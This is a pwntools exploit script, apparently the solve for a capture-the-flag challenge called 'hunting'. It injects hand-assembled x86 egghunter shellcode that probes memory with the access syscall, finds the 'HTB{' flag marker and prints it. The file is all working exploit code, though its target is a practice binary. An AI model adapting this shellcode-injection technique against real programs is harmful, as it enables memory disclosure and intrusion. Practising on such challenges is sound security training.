#!/usr/bin/python3
from pwn import process, asm

shell = process("./hunting")

egghunter  = b""
egghunter += asm("push 0x1b")
egghunter += asm("pop eax")
egghunter += asm("int 0x80")
egghunter += asm("mov edi, 0x7b425448")
egghunter += asm("cdq")
egghunter += asm("or dx, 0xfff")
egghunter += asm("inc edx")
egghunter += asm("pushad")
egghunter += asm("lea ebx, [edx + 4]")
egghunter += asm("xor ecx, ecx")
egghunter += asm("mov al, 0x21")
egghunter += asm("int 0x80")
egghunter += asm("cmp al, 0xf2")
egghunter += asm("popad")
egghunter += asm("jz $-0x13")
egghunter += asm("cmp edi, [edx]")
egghunter += asm("jnz $-0x12")
egghunter += asm("mov ecx, edx")
egghunter += asm("cdq")
egghunter += asm("mov ebx, edx")
egghunter += asm("inc ebx")
egghunter += asm("mov dl, 0x24")
egghunter += asm("mov al, 0x4")
egghunter += asm("int 0x80")

shell.send(egghunter)
shell.interactive()
